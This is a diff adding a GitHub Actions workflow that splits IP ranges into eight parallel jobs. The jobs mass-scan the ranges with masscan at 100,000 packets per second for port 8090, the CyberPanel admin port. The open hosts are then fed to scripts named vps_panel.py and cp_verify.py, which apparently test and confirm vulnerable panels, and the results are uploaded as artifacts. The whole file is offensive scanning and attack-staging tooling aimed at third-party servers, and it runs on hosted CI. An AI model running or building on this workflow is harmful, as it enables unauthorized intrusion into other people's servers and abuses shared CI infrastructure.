@@ -1,0 +1,33 @@
+name: fullcp
+on: workflow_dispatch
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1, 2, 3, 4, 5, 6, 7, 8]
+    steps:
+      - uses: actions/checkout@v4
+      - run: sudo apt-get update -qq && sudo apt-get install -y -qq masscan && pip install -q requests
+      - run: |
+          : > c_all.txt
+          for r in $(cat r8_${{ matrix.shard }}.txt); do
+            sudo masscan $r -p8090 --rate 100000 -oL c1.txt --wait 0 >/dev/null 2>&1 || true
+            cat c1.txt >> c_all.txt 2>/dev/null || true
+          done
+          awk '$1=="open"{print $4":"$3}' c_all.txt | sort -u > cp_hosts.txt
+          echo "=== cyberpanel hosts: $(wc -l < cp_hosts.txt) ==="
+          python3 vps_panel.py cp_hosts.txt || true
+          grep -o '"host": "[^"]*"' /tmp/vps_panel_hits.jsonl 2>/dev/null | cut -d'"' -f4 > cp_hits.txt || true
+          echo "candidates: $(wc -l < cp_hits.txt 2>/dev/null || echo 0)"
+          python3 cp_verify.py cp_hits.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: fullcp-${{ matrix.shard }}
+          path: |
+            /tmp/vps_panel_result.json
+            cp_hosts.txt
+          if-no-files-found: warn
